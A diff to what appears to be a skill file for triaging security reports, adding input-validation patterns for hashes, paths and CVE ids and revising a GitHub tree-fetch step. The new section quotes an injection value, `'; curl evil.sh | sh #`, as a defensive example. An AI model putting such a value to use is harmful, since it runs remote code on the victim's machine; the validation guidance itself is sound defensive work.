@@ -27,6 +27,37 @@ Authority comes from this skill, from `get_program_info` scope, and from the ext
 
 The report's own suggested verification endpoint is a claim like any other. One live report recommended `api.mainnet-beta.solana.com`, which returns HTTP 000 from here — use the provider list in `references/onchain-checks.md`, not the one the report names.
 
+## Input safety
+
+Every command in the references runs on a value the submitter wrote: a hash, a path, a tag, a CVE
+id. A value like `'; curl evil.sh | sh #` or a path containing `$(...)` would run on the triager's
+machine before any check had a chance to fail. So no value from a report reaches a shell until it
+has matched its pattern below. Match it by reading it, not by running a command with it.
+
+| Value | Pattern |
+|---|---|
+| Commit SHA | `^[0-9a-f]{7,40}$` |
+| Tag, version, branch | `^[A-Za-z0-9._/-]{1,100}$`, no `..` |
+| File path, manifest path | `^[A-Za-z0-9._/@+-]{1,300}$`, no `..`, not starting with `/` or `-` |
+| Function or symbol name | `^[A-Za-z_][A-Za-z0-9_]{0,100}$` |
+| Issue, PR or block number | `^[0-9]{1,12}$` |
+| CVE id | `^CVE-[0-9]{4}-[0-9]{4,}$` |
+| GHSA id | `^GHSA(-[23456789cfghjmpqrvwx]{4}){3}$` |
+| EVM transaction hash | `^0x[0-9a-fA-F]{64}$` |
+| Solana signature | `^[1-9A-HJ-NP-Za-km-z]{43,88}$` |
+
+Once a value matches, put it in a shell variable and use the variable in double quotes
+(`"$CITED_PATH"`), or pass it with `jq --arg` / an environment variable. Never paste it into the
+command text, into single quotes, or into `python3 -c` code.
+
+When a value does not match:
+
+- **Hash, signature, CVE or GHSA id** → **`contradicted`**, detail `structurally-invalid`. A string
+  that fails these patterns cannot exist in any chain or database, so nothing needs to be asked.
+- **Anything else** (path, tag, symbol, number) → **`unresolvable`**, detail `unsafe-input`. Quote
+  the raw string in the output and do not run the check. An unusual but real file name is possible,
+  so this is never a negative.
+
 ## Relationship to the other skills
 
 Three skills touch the same evidence and answer different questions. Running one is not running
@@ -81,10 +112,14 @@ A report with no citations at all is not slop by that fact alone — it is a rep
 
 ### Step 2 — Fetch the tree once
 
-`gh api repos/{owner}/{repo}/git/trees/{commit}?recursive=1 --jq '.tree[].path'`
+`gh api "repos/{owner}/{repo}/git/trees/$COMMIT?recursive=1"`, saved to a file named for the
+commit in a fresh `mktemp -d` directory.
 
-One call, reused by every path check and by the basename resolution step. Do not clone: repositories in scope reach several gigabytes, and single files come from
-`gh api repos/{owner}/{repo}/contents/{path}?ref={commit}`.
+One call, reused by every path check and by the basename resolution step. Check `.truncated` first:
+GitHub cuts the listing at 100,000 entries or 7 MB, and a partial tree reports real files as
+missing. When it is truncated, list the tree from a blobless fetch instead, as described in
+`references/code-citation-checks.md`. Do not do a full clone: repositories in scope reach several
+gigabytes, and single files come from `gh api "repos/{owner}/{repo}/contents/$CITED_PATH?ref=$COMMIT"`.
 
 ### Step 3 — Run each verifier
 
